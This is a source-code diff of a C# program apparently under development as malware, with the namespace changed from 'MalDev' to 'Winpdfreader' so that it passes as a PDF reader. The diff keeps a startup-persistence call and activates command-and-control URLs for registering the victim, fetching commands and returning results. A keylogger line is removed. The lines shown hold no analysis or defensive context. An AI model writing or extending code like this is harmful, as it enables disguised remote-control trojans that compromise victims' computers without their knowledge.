@@ -7,13 +7,13 @@ using System.Runtime.InteropServices;
 
 // dotnet publish -c Release -r win-x64 --self-contained
 
-namespace MalDev
+namespace Winpdfreader
 {
     class Program
     {
         static void Main(string[] args)
         {
-            ConsoleExtension.Hide();
+            // ConsoleExtension.Hide();
             GeneralInfo infoObj = new GeneralInfo();
             Persistance persObj = new Persistance(infoObj);
             Operations opsObj = new Operations(infoObj);
@@ -25,7 +25,6 @@ namespace MalDev
             
             persObj.AddToStartup();
             // infoObj.printInfos();
-            Keylog keylogObj = new Keylog();
 
             // if (args == null || args.Length == 0)
             // {
@@ -60,9 +59,9 @@ namespace MalDev
             // string fakeFile2 = "l";
             // string fakeFile3 = "";
 
-            // string registerUrl = "http://192.168.96.132/register.php";
-            // string getResults = "http://192.168.96.132/getResults.php";
-            // string getCmd = "http://192.168.96.132/getCmd.php";
+            string registerUrl = "http://192.168.96.132/register.php";
+            string getResults = "http://192.168.96.132/getResults.php";
+            string getCmd = "http://192.168.96.132/getCmd.php";
             
             GeneralInfo infoObj = new GeneralInfo();
             Operations opsObj = new Operations(infoObj);
